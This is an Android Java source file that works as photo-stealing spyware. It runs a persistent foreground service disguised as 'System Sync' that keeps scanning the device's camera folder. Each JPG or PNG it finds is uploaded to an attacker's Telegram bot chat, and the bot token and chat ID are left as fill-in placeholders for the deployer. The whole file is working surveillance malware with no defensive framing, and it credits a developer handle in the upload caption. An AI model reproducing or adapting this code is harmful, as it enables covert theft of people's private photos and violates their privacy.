package com.my.project10;

import java.io.*;
import java.net.*;
import android.app.*;
import android.content.*;
import android.os.*;
import androidx.core.app.NotificationCompat;

public class TelegramManager {

    
    private static boolean isAlreadySent(Context context, String fileName) {
        SharedPreferences pref = context.getSharedPreferences("SentFiles", Context.MODE_PRIVATE);
        return pref.getBoolean(fileName, false);
    }


    private static void markAsSent(Context context, String fileName) {
        SharedPreferences pref = context.getSharedPreferences("SentFiles", Context.MODE_PRIVATE);
        pref.edit().putBoolean(fileName, true).apply();
    }

    
    public static void uploadFile(final Context context, final String botToken, final String chatId, final String filePath) {
        final File file = new File(filePath);
        
        
        if (!file.exists() || isAlreadySent(context, file.getName())) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection con = null;
                try {
                    
                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
                    con = (HttpURLConnection) url.openConnection();
                    con.setDoOutput(true);
                    con.setRequestMethod("POST");
                    String boundary = "===" + System.currentTimeMillis() + "===";
                    con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = con.getOutputStream();
                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                    
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                    writer.append(chatId).append("\r\n");

                    
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
                    writer.append("Developer @ArmanKhan_BDT").append("\r\n");

                    
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"").append("\r\n");
                    writer.append("Content-Type: image/jpeg").append("\r\n\r\n");
                    writer.flush();

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) { 
                        os.write(buffer, 0, bytesRead); 
                    }
                    os.flush(); fis.close();
                    
                    writer.append("\r\n").flush();
                    writer.append("--" + boundary + "--").append("\r\n");
                    writer.close();

                   
                    if (con.getResponseCode() == 200) {
                        markAsSent(context, file.getName());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (con != null) con.disconnect();
                }
            }
        }).start();
    }

    
    public static class BackgroundService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel("Ch1", "Sync", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);
                
                startForeground(1, new NotificationCompat.Builder(this, "Ch1")
                        .setContentTitle("System Sync")
                        .setContentText("Checking files...")
                        .setSmallIcon(android.R.drawable.ic_menu_save)
                        .build());
            }

            // --####----
            final String token = "Enter Your Bot Token"; 
            final String id = "Entar your Chat id";
            // -------------------------------------------------------

            final String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/Camera";

            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        try {
                            File dir = new File(path);
                            File[] files = dir.listFiles();
                            if (files != null) {
                                for (File f : files) {
                                    String name = f.getName().toLowerCase();
                                    
                                    if (f.isFile() && (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png"))) {
                                        uploadFile(getApplicationContext(), token, id, f.getAbsolutePath());
                                        Thread.sleep(10000); 
                                    }
                                }
                            }
                            Thread.sleep(30000); 
                        } catch (Exception e) {}
                    }
                }
            }).start();
            
            return START_STICKY; 
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }
    }
}

